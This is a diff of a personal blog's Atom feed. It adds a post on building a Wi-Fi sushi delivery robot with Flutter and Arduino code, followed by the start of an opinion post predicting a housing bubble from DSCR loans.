@@ -1,389 +1,758 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-09-10T22:53:50-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">forkbomb.io</title><subtitle>secure state of mind</subtitle><entry><title type="html">Void Pool: Dive into the Abyss of Grimdark Finance</title><link href="http://localhost:4000/blog/void-pool-dive-into-the-abyss-of-grimdark-finance" rel="alternate" type="text/html" title="Void Pool: Dive into the Abyss of Grimdark Finance" /><published>2023-09-05T00:00:00-07:00</published><updated>2023-09-05T00:00:00-07:00</updated><id>http://localhost:4000/blog/void-pool-dive-into-the-abyss-of-grimdark-finance</id><content type="html" xml:base="http://localhost:4000/blog/void-pool-dive-into-the-abyss-of-grimdark-finance">&lt;p&gt;Today, I present an enticing invitation to dive deep into the shadowy, interwoven realms of finance, politics, and technology. Enter Void Pool, a uniquely grimdark finance podcast that promises to be an illuminating journey like no other.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2025-08-03T23:20:47-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">forkbomb.io</title><subtitle>secure state of mind</subtitle><entry><title type="html">Bullet Train Sushi Robot: Flutter + Arduino Control for Zenpo Sushi</title><link href="http://localhost:4000/blog/bullet-train-sushi-robot" rel="alternate" type="text/html" title="Bullet Train Sushi Robot: Flutter + Arduino Control for Zenpo Sushi" /><published>2025-07-27T00:00:00-07:00</published><updated>2025-07-27T00:00:00-07:00</updated><id>http://localhost:4000/blog/bullet-train-sushi-robot</id><content type="html" xml:base="http://localhost:4000/blog/bullet-train-sushi-robot"><![CDATA[<blockquote>
+  <p><strong>TL;DR</strong> — I built a <strong>bullet train sushi robot</strong> control stack for Zenpo Sushi.<br />
+The mobile UI is a <strong>Flutter</strong> app that drives a Wi‑Fi robot over simple HTTP commands; the firmware is <strong>Arduino</strong> (WiFiNINA) orchestrating dual motors, a Hall sensor for position, a hardware <strong>Return/Home</strong> button, and idle‑safety logic. This post walks through the architecture, the code, and the production hardening plan.</p>
+</blockquote>
+
+<hr />
+
+<h2 id="why-a-bullet-train-instead-of-a-conveyor">Why a “bullet train” instead of a conveyor?</h2>
+
+<p>Two things: <strong>precision</strong> and <strong>experience</strong>. Traditional conveyors are constant‑motion and high‑maintenance. A point‑to‑point “train” lets us schedule deliveries to specific seats, <strong>stop exactly where needed</strong>, and create a guest experience that feels futuristic without a full AGV stack.</p>
+
+<hr />
+
+<h2 id="system-architecture">System architecture</h2>
+
+<p><strong>Client (Flutter, Material 3)</strong></p>
+<ul>
+  <li>Select “Robot 1” or “Robot 2” (two cars on the line).</li>
+  <li>Send commands over HTTP: <code class="language-plaintext highlighter-rouge">START</code>, <code class="language-plaintext highlighter-rouge">STOP</code>, <code class="language-plaintext highlighter-rouge">REVERSE</code>, <code class="language-plaintext highlighter-rouge">RETURN</code>, <code class="language-plaintext highlighter-rouge">GOTO{n}</code>, <code class="language-plaintext highlighter-rouge">SENSOR</code>.</li>
+  <li>Poll sensor data every 2 seconds for live position.</li>
+</ul>
+
+<p><strong>Controller (Arduino + WiFiNINA)</strong></p>
+<ul>
+  <li>Hosts a minimal HTTP server on port <strong>80</strong>.</li>
+  <li>Drives two motors (enable/direction/speed) via motor drivers.</li>
+  <li><strong>Hall effect sensor</strong> increments/decrements <code class="language-plaintext highlighter-rouge">position</code> (0–15 stops).</li>
+  <li><strong>Return button</strong> ISR to home the train immediately.</li>
+  <li><strong>Idle safety</strong>: if no movement for 30s away from home → auto return.</li>
+</ul>
+
+<p><strong>Network</strong></p>
+<ul>
+  <li>Static IPs per robot: <code class="language-plaintext highlighter-rouge">192.168.1.201</code> and <code class="language-plaintext highlighter-rouge">192.168.1.207</code>.</li>
+  <li>Flat HTTP interface (human‑readable), easy to script and test.</li>
+</ul>
+
+<hr />
+
+<h2 id="the-flutter-app-operator-ui">The Flutter app (operator UI)</h2>
+
+<p>The app uses <code class="language-plaintext highlighter-rouge">http</code> and a periodic <code class="language-plaintext highlighter-rouge">Timer</code> to poll the robot sensor endpoint, show current status, and drive motion by tap. Controls are intentionally <strong>simple and fast</strong>—kitchen staff shouldn’t fight UI when service is slammed.</p>
+
+<div class="language-dart highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Pick robot by toggling a switch</span>
+<span class="kt">String</span> <span class="kd">get</span> <span class="n">robotIpAddress</span> <span class="o">=</span><span class="p">&gt;</span> <span class="n">isRobot1Selected</span>
+  <span class="o">?</span> <span class="s">'192.168.1.201'</span>
+  <span class="o">:</span> <span class="s">'192.168.1.207'</span><span class="p">;</span>
+
+<span class="c1">// Send human-readable commands over HTTP</span>
+<span class="n">Future</span><span class="p">&lt;</span><span class="kt">void</span><span class="p">&gt;</span> <span class="n">sendCommand</span><span class="p">(</span><span class="kt">String</span> <span class="n">command</span><span class="p">)</span> <span class="kd">async</span> <span class="p">{</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="kd">final</span> <span class="n">res</span> <span class="o">=</span> <span class="k">await</span> <span class="n">http</span><span class="o">.</span><span class="na">get</span><span class="p">(</span><span class="kt">Uri</span><span class="o">.</span><span class="na">parse</span><span class="p">(</span><span class="s">'http://</span><span class="si">$robotIpAddress</span><span class="s">/</span><span class="si">$command</span><span class="s">'</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="na">statusCode</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">setState</span><span class="p">(()</span> <span class="p">{</span>
+        <span class="n">sensorData</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="na">body</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">command</span> <span class="o">==</span> <span class="s">'SENSOR'</span><span class="p">)</span> <span class="p">{</span>
+          <span class="c1">// Expect: "Current Position: X"</span>
+          <span class="kd">final</span> <span class="n">parts</span> <span class="o">=</span> <span class="n">sensorData</span><span class="o">.</span><span class="na">trim</span><span class="p">()</span><span class="o">.</span><span class="na">split</span><span class="p">(</span><span class="s">' '</span><span class="p">);</span>
+          <span class="n">position</span> <span class="o">=</span> <span class="kt">int</span><span class="o">.</span><span class="na">tryParse</span><span class="p">(</span><span class="n">parts</span><span class="o">.</span><span class="na">isNotEmpty</span> <span class="o">?</span> <span class="n">parts</span><span class="o">.</span><span class="na">last</span> <span class="o">:</span> <span class="s">'0'</span><span class="p">)</span> <span class="o">??</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="p">});</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="n">setState</span><span class="p">(()</span> <span class="o">=</span><span class="p">&gt;</span> <span class="n">sensorData</span> <span class="o">=</span> <span class="s">'Error: </span><span class="si">${res.statusCode}</span><span class="s">'</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">setState</span><span class="p">(()</span> <span class="o">=</span><span class="p">&gt;</span> <span class="n">sensorData</span> <span class="o">=</span> <span class="s">'Error: </span><span class="si">$e</span><span class="s">'</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>Nice touches:</strong></p>
+<ul>
+  <li>Periodic telemetry: Timer.periodic(Duration(seconds: 2), …) keeps the UI synced without spamming the controller.</li>
+  <li>Declarative commands: goToPosition(12) maps to GET /GOTO12—clear and inspectable.</li>
+  <li>Dual‑robot switch: one UI pane, two IPs, zero confusion during service.</li>
+</ul>
+
+<h2 id="the-arduino-controller-deterministic-movement">The Arduino controller (deterministic movement)</h2>
+
+<p>On the microcontroller, interrupts turn a low‑cost Hall sensor into a reliable position counter; each magnet “tick” increments or decrements depending on direction. Movement is bounded within 0..15 stops, and we stop on end‑stops or when the target position is reached.</p>
+
+<div class="language-dart highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">volatile</span> <span class="kt">int</span> <span class="n">position</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">volatile</span> <span class="kt">bool</span> <span class="n">magnetDetected</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="n">volatile</span> <span class="kt">bool</span> <span class="n">returnButtonPressed</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">targetPosition</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="n">unsigned</span> <span class="n">long</span> <span class="n">lastMotorActivityTime</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">hallSensorISR</span><span class="p">()</span> <span class="p">{</span> <span class="n">magnetDetected</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span> <span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">startMotors</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">enablePin1</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>  <span class="c1">// forward on motor 1</span>
+  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">directionPin1</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+  <span class="n">analogWrite</span><span class="p">(</span><span class="n">speedPin1</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
+
+  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">enablePin2</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>  <span class="c1">// forward on motor 2 (opposite wiring)</span>
+  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">directionPin2</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+  <span class="n">analogWrite</span><span class="p">(</span><span class="n">speedPin2</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
+
+  <span class="n">lastMotorActivityTime</span> <span class="o">=</span> <span class="n">millis</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">reverseMotors</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">enablePin1</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">directionPin1</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+  <span class="n">analogWrite</span><span class="p">(</span><span class="n">speedPin1</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
+
+  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">enablePin2</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">directionPin2</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+  <span class="n">analogWrite</span><span class="p">(</span><span class="n">speedPin2</span><span class="p">,</span> <span class="mi">255</span><span class="p">);</span>
+
+  <span class="n">lastMotorActivityTime</span> <span class="o">=</span> <span class="n">millis</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">stopMotors</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">enablePin1</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+  <span class="n">analogWrite</span><span class="p">(</span><span class="n">speedPin1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">enablePin2</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
+  <span class="n">analogWrite</span><span class="p">(</span><span class="n">speedPin2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>A tiny HTTP handler parses the request line and routes commands:</p>
+
+<div class="language-dart highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">executeCommand</span><span class="p">(</span><span class="kt">String</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">WiFiClient</span> <span class="o">&amp;</span><span class="n">client</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="s">"START"</span><span class="p">)</span>       <span class="p">{</span> <span class="n">startMotors</span><span class="p">();</span> <span class="n">client</span><span class="o">.</span><span class="na">println</span><span class="p">(</span><span class="s">"Motors started"</span><span class="p">);</span> <span class="p">}</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="s">"STOP"</span><span class="p">)</span>   <span class="p">{</span> <span class="n">stopMotors</span><span class="p">();</span>  <span class="n">client</span><span class="o">.</span><span class="na">println</span><span class="p">(</span><span class="s">"Motors stopped"</span><span class="p">);</span> <span class="p">}</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="s">"REVERSE"</span><span class="p">){</span> <span class="n">reverseMotors</span><span class="p">();</span> <span class="n">client</span><span class="o">.</span><span class="na">println</span><span class="p">(</span><span class="s">"Motors reversed"</span><span class="p">);</span> <span class="p">}</span>
+  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">"GOTO"</span><span class="p">))</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="kt">int</span> <span class="n">newPos</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">.</span><span class="na">substring</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="na">toInt</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">newPos</span> <span class="p">&gt;</span><span class="o">=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">newPos</span> <span class="p">&lt;</span><span class="o">=</span> <span class="mi">15</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">targetPosition</span> <span class="o">=</span> <span class="n">newPos</span><span class="p">;</span>
+      <span class="p">(</span><span class="n">targetPosition</span> <span class="p">&gt;</span> <span class="n">position</span><span class="p">)</span> <span class="o">?</span> <span class="n">startMotors</span><span class="p">()</span> <span class="o">:</span> <span class="n">reverseMotors</span><span class="p">();</span>
+      <span class="n">client</span><span class="o">.</span><span class="na">println</span><span class="p">(</span><span class="kt">String</span><span class="p">(</span><span class="s">"Moving to position: "</span><span class="p">)</span> <span class="o">+</span> <span class="n">targetPosition</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="n">client</span><span class="o">.</span><span class="na">println</span><span class="p">(</span><span class="s">"Invalid position"</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="s">"SENSOR"</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">client</span><span class="o">.</span><span class="na">println</span><span class="p">(</span><span class="kt">String</span><span class="p">(</span><span class="s">"Current Position: "</span><span class="p">)</span> <span class="o">+</span> <span class="n">position</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="s">"RETURN"</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">returnButtonPressed</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="n">client</span><span class="o">.</span><span class="na">println</span><span class="p">(</span><span class="s">"Returning to original position"</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">magnetDetected</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">magnetDetected</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="c1">// Decide direction from pin state</span>
+    <span class="n">position</span> <span class="o">+=</span> <span class="p">(</span><span class="n">digitalRead</span><span class="p">(</span><span class="n">directionPin1</span><span class="p">)</span> <span class="o">==</span> <span class="n">LOW</span><span class="p">)</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="n">position</span> <span class="o">=</span> <span class="n">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">min</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="mi">15</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">position</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">position</span> <span class="o">==</span> <span class="mi">15</span> <span class="o">||</span> <span class="n">position</span> <span class="o">==</span> <span class="n">targetPosition</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">stopMotors</span><span class="p">();</span>
+      <span class="n">targetPosition</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">returnButtonPressed</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">returnButtonPressed</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="n">targetPosition</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="n">reverseMotors</span><span class="p">();</span> <span class="c1">// head toward home (0)</span>
+  <span class="p">}</span>
+
+  <span class="c1">// Serve HTTP requests (headers omitted here for brevity)</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">WiFiClient</span> <span class="n">client</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="na">available</span><span class="p">())</span> <span class="p">{</span>
+    <span class="kt">String</span> <span class="n">currentLine</span> <span class="o">=</span> <span class="s">""</span><span class="p">,</span> <span class="n">command</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">client</span><span class="o">.</span><span class="na">connected</span><span class="p">())</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">client</span><span class="o">.</span><span class="na">available</span><span class="p">())</span> <span class="p">{</span>
+        <span class="n">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="na">read</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> <span class="p">{</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">currentLine</span><span class="o">.</span><span class="na">length</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">client</span><span class="o">.</span><span class="na">println</span><span class="p">(</span><span class="s">"HTTP/1.1 200 OK"</span><span class="p">);</span>
+            <span class="n">client</span><span class="o">.</span><span class="na">println</span><span class="p">(</span><span class="s">"Content-type:text/plain"</span><span class="p">);</span>
+            <span class="n">client</span><span class="o">.</span><span class="na">println</span><span class="p">(</span><span class="s">"Access-Control-Allow-Origin: *"</span><span class="p">);</span>
+            <span class="n">client</span><span class="o">.</span><span class="na">println</span><span class="p">();</span>
+            <span class="n">executeCommand</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">client</span><span class="p">);</span>
+            <span class="n">client</span><span class="o">.</span><span class="na">println</span><span class="p">();</span>
+            <span class="k">break</span><span class="p">;</span>
+          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="n">currentLine</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span> <span class="p">}</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="s">'</span><span class="se">\r</span><span class="s">'</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">currentLine</span> <span class="o">+=</span> <span class="n">c</span><span class="p">;</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">currentLine</span><span class="o">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">"GET /"</span><span class="p">))</span> <span class="p">{</span>
+            <span class="n">command</span> <span class="o">=</span> <span class="n">currentLine</span><span class="o">.</span><span class="na">substring</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">currentLine</span><span class="o">.</span><span class="na">indexOf</span><span class="p">(</span><span class="s">' '</span><span class="p">,</span> <span class="mi">5</span><span class="p">));</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="n">client</span><span class="o">.</span><span class="na">stop</span><span class="p">();</span>
+  <span class="p">}</span>
+
+  <span class="c1">// Idle safety: after 30s off-home, return to 0</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">millis</span><span class="p">()</span> <span class="o">-</span> <span class="n">lastMotorActivityTime</span> <span class="p">&gt;</span> <span class="mi">30000</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">position</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">digitalRead</span><span class="p">(</span><span class="n">enablePin1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">digitalRead</span><span class="p">(</span><span class="n">enablePin2</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">reverseMotors</span><span class="p">();</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="n">delay</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Why this works well in a kitchen</p>
+<ul>
+  <li>Deterministic: magnets = discrete stops; no encoders necessary.</li>
+  <li>Fail‑safe: end‑stop bounds + idle watchdog + physical home button.</li>
+  <li>Observable: the API is human‑readable—curl is a valid control panel.</li>
+</ul>
+
+<h2 id="command-api-humanreadable-dead-simple">Command API (human‑readable, dead simple)</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Action</th>
+      <th>HTTP</th>
+      <th>Behavior</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Start</td>
+      <td><code class="language-plaintext highlighter-rouge">GET /START</code></td>
+      <td>Drive forward at full speed</td>
+    </tr>
+    <tr>
+      <td>Stop</td>
+      <td><code class="language-plaintext highlighter-rouge">GET /STOP</code></td>
+      <td>Disable drivers and PWM</td>
+    </tr>
+    <tr>
+      <td>Reverse</td>
+      <td><code class="language-plaintext highlighter-rouge">GET /REVERSE</code></td>
+      <td>Drive in reverse at full speed</td>
+    </tr>
+    <tr>
+      <td>Go to <code class="language-plaintext highlighter-rouge">n</code></td>
+      <td><code class="language-plaintext highlighter-rouge">GET /GOTO{n}</code></td>
+      <td>Move to magnet index <code class="language-plaintext highlighter-rouge">n</code> (0–15)</td>
+    </tr>
+    <tr>
+      <td>Sensor</td>
+      <td><code class="language-plaintext highlighter-rouge">GET /SENSOR</code></td>
+      <td>Returns <code class="language-plaintext highlighter-rouge">Current Position: X</code></td>
+    </tr>
+    <tr>
+      <td>Return (home)</td>
+      <td><code class="language-plaintext highlighter-rouge">GET /RETURN</code></td>
+      <td>Immediately head back toward <code class="language-plaintext highlighter-rouge">0</code> (home)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>Debugging tip:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://192.168.1.201/SENSOR
+curl http://192.168.1.201/GOTO7
+</code></pre></div></div>
+
+<h2 id="production-hardening-roadmap">Production hardening roadmap</h2>
+
+<p><em>What I’d ship for a multi‑car line and all‑day service reliability.</em></p>
+
+<h3 id="1-devsecops--updates">1) DevSecOps &amp; updates</h3>
+<ul>
+  <li>Private Wi‑Fi SSID + VLAN segmentation; PSK rotation playbook.</li>
+  <li>HMAC‑signed commands or mTLS for controller endpoints.</li>
+  <li>Reproducible builds, versioned artifacts, and <strong>OTA updates</strong>.</li>
+  <li>SLSA‑aligned binaries + SBOM for the firmware.</li>
+</ul>
+
+<h3 id="2-observability">2) Observability</h3>
+<ul>
+  <li>Structured logs → a lightweight collector (e.g., fluent‑bit → Loki).</li>
+  <li>Traces for command latency; counters for stops hit/missed, emergency returns.</li>
+  <li>Grafana dashboard for FOH/BOH visibility.</li>
+</ul>
+
+<h3 id="3-scheduling--choreography">3) Scheduling &amp; choreography</h3>
+<ul>
+  <li>Small <strong>job queue</strong> (seat → stop) with collision avoidance when multiple cars share track segments.</li>
+  <li>SLA timing windows (e.g., “deliver within 60s”) and escalation to a runner.</li>
+</ul>
+
+<h3 id="4-safety--mechanicals">4) Safety &amp; mechanicals</h3>
+<ul>
+  <li>Speed caps near end‑stops; PWM ramping for gentle docking.</li>
+  <li>Current sensing → stall detection → auto stop + alert.</li>
+</ul>
+
+<h3 id="5-developer-experience">5) Developer Experience</h3>
+<ul>
+  <li>Quickstart, API reference, and a <strong>demo Flutter app</strong> for operators.</li>
+  <li>Workshop curriculum at the makerspace for onboarding new staff/volunteers.</li>
+</ul>
+
+<hr />
+
+<h2 id="lessons-learned">Lessons learned</h2>
+
+<ul>
+  <li><strong>Interrupts &gt; polling</strong> for physical signals—cheap sensors become reliable state.</li>
+  <li><strong>Bound everything:</strong> speed, range, retries—kitchens are adversarial environments.</li>
+  <li><strong>Flat HTTP is underrated</strong> in local robotics—inspectable, testable, scriptable.</li>
+  <li><strong>UX is throughput:</strong> one‑tap “Go to N” buttons beat free‑form inputs during a dinner rush.</li>
+</ul>
+
+<hr />
+
+<h2 id="hiring-consulting-and-contact">Hiring, consulting, and contact</h2>
+
+<p>This project blends <strong>embedded systems</strong>, <strong>real‑time control</strong>, <strong>DevSecOps</strong>, and <strong>developer experience</strong>—the same mix I bring to teams building robotics, industrial IoT, or applied AI.</p>
+
+<ul>
+  <li><strong>Consulting / Fractional CTO:</strong> <a href="/consulting/">Start a consultation</a></li>
+  <li><strong>Email:</strong> turingxo@gmail.com</li>
+  <li><strong>Makerspace:</strong> <a href="https://frontiertower.io">frontiertower.io</a></li>
+</ul>
+
+<p>If you’re hiring for <strong>Platform/DevSecOps</strong>, <strong>Robotics/IoT</strong>, or <strong>Developer Advocacy</strong> (I lead a 5,000+ developer community in SF), I’d love to talk.</p>]]></content><author><name></name></author><category term="blog" /><summary type="html"><![CDATA[Designing and building a bullet train–style sushi delivery robot with Flutter (client) and Arduino (controller). Networked control, safety interlocks, telemetry, and production-ready next steps.]]></summary></entry><entry><title type="html">Predicting the Pop of the Housing Bubble through DSCR Loans</title><link href="http://localhost:4000/blog/predicting-the-pop-of-the-housing-bubble-through-dscr-loans" rel="alternate" type="text/html" title="Predicting the Pop of the Housing Bubble through DSCR Loans" /><published>2023-09-10T00:00:00-07:00</published><updated>2023-09-10T00:00:00-07:00</updated><id>http://localhost:4000/blog/predicting-the-pop-of-the-housing-bubble-through-dscr-loans</id><content type="html" xml:base="http://localhost:4000/blog/predicting-the-pop-of-the-housing-bubble-through-dscr-loans"><![CDATA[<p>I have become increasingly convinced that we are witnessing the formation of a new subprime mortgage bubble. Drawing parallels to the dynamics that led to the devastating financial crisis of 2008, fueled by rampant subprime mortgage issuance, I see a similar storm brewing due to the aggressive overissuance of DSCR (Debt Service Coverage Ratio) loans. If unchecked, this trend could set the stage for another financial upheaval with lasting repercussions for the housing market and the broader economy.</p>
+
+<h2 id="what-are-dscr-loans">What are DSCR Loans?</h2>
+
+<p><a href="https://www.investopedia.com/terms/d/dscr.asp#:~:text=The%20debt%2Dservice%20coverage%20ratio%20(DSCR)%20measures%20a%20firm's,service%2C%20including%20principal%20and%20interest.">DSCR (Debt Service Coverage Ratio) loans</a> have emerged as a significant financial instrument in property investment, especially in short-term rentals. Unlike traditional loans that evaluate a buyer’s personal financial health, DSCR loans focus on the projected income of a property, <a href="https://griffinfunding.com/blog/dscr-loans/dscr-loan-for-airbnb/">making them particularly appealing to investors in platforms like Airbnb</a>. \</p>
+
+<p>These DSCR loans operate differently than traditional mortgages, as they do not evaluate a buyer’s personal income. Instead, they focus on the projected income a property is expected to generate. Historically, these loans were crafted for commercial properties, but over time, their applicability has broadened to encompass properties on platforms like Airbnb.</p>
+
+<h3 id="benefits-of-dscr-loans-for-short-term-rentals">Benefits of DSCR Loans for Short-Term Rentals:</h3>
+
+<ul>
+  <li><strong>Qualifying without personal income documentation:</strong> DSCR loans enable investors to obtain financing without the need for traditional personal income proof, catering especially to those with non-standard income streams.</li>
+  <li><strong>Faster closing times due to fewer verification steps:</strong> The streamlined focus on property revenue over personal finances expedites the loan process, leading to quicker transaction completions.</li>
+  <li><strong>No limitations on the number of properties under DSCR loans:</strong> Investors can expand their portfolios without restriction, facilitating broader investment in multiple properties concurrently.</li>
+  <li><strong>Unlimited cash-out opportunities based on home equity:</strong> Property owners can liberate funds equivalent to their home’s equity, providing a flexible means to access capital for various needs.</li>
+  <li><strong>Separation of personal and business finances with DSCR loans:</strong> By securing the loan under an entity like an LLC, investors can distinctly partition their personal financial matters from their rental business, promoting clearer financial management.</li>
+</ul>
+
